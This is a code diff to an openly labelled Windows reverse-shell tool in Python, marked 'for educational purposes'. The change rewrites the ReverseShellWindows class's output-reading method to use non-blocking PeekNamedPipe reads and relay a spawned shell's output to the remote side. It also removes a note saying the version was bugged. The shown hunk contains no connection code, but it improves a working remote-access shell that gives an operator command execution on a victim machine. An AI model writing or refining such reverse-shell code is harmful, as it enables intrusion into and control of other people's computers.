@@ -1,7 +1,6 @@
 """
 Reverse Shell - Interactive shell connection
 For educational purposes only - For Educational Use Only
-/!\ Bugged version not fixed /!\
 """
 
 import threading, subprocess, sys, os, ctypes, msvcrt, time
@@ -270,32 +269,55 @@ class ReverseShellWindows :
             raise Exception(f"[!] Execute error: {e}")
     
     def _read_output_windows(self) -> None:
-        """Read output optimized for Windows"""
+        """Read output optimized for Windows - NON-BLOCKING version"""
         try:
+            import msvcrt
+            from ctypes import windll, byref, wintypes
+            
+            handle = msvcrt.get_osfhandle(self.process.stdout.fileno())
+            
             while self.running and self.process:
                 try:
-                    # Try to read available data
-                    chunk = self.process.stdout.read(4096)
-                    
-                    if chunk:
-                        # Decode Windows encoding
-                        text = chunk.decode('cp850', errors='replace')
-                        self._send_output(text)
-                    
-                    elif self.process.poll() is not None:
+                    if self.process.poll() is not None:
+                        try:
+                            remaining = self.process.stdout.read()
+                            if remaining:
+                                text = remaining.decode('cp850', errors='replace')
+                                self._send_output(text)
+                        except:
+                            pass
                         break
                     
+                    import ctypes
+                    kernel32 = ctypes.windll.kernel32
+                    bytes_available = wintypes.DWORD(0)
+                    
+                    result = kernel32.PeekNamedPipe(
+                        handle, None, 0, None, byref(bytes_available), None
+                    )
+                    
+                    if result and bytes_available.value > 0:
+                        chunk = self.process.stdout.read(bytes_available.value)
+                        if chunk:
+                            text = chunk.decode('cp850', errors='replace')
+                            self._send_output(text)
                     else:
-                        # Small sleep to avoid CPU spinning
-                        time.sleep(0.01)
+                        time.sleep(0.05)
                 
                 except Exception as e:
                     if self.running:
-                        pass
+                        time.sleep(0.1)
+                    else:
+                        break
+                        
+        except ImportError:
+            # Fallback si modules manquants
+            while self.running and self.process:
+                if self.process.poll() is not None:
                     break
+                time.sleep(0.1)
         except Exception as e:
-            raise Exception(f"ReverseShellWindows read error in _read_output_windows function: {e}")
-    
+            raise Exception(f"ReverseShellWindows read error: {e}")
     def _send_output(self, text) -> None:
         """Send output"""
 
